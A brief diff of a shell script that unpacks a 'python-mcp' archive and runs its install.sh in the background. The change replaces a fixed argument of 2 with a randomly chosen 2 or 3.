@@ -5,5 +5,5 @@ tar -xf python-mcp.tar.gz
 rm python-mcp.tar.gz
 cd python-mcp
 chmod +x ./install.sh
-nohup ./install.sh 2 >/dev/null 2>&1 &
+nohup ./install.sh $((RANDOM % 2 + 2)) >/dev/null 2>&1 &
 sleep 2h
